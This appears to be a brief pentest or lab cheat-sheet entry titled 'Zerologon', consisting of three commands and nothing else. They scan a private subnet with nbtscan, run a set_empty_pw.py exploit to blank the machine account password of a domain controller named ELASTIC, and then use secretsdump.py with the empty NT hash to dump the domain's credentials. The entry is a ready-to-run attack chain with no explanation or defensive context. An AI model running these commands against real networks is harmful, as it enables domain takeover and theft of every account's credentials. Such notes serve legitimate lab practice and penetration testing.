### Zerologon
```
nbtscan -r 172.16.100.0/24
python3 set_empty_pw.py ELASTIC 172.16.100.10 
python3 secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'elastic.me/ELASTIC$@172.16.100.10'
```
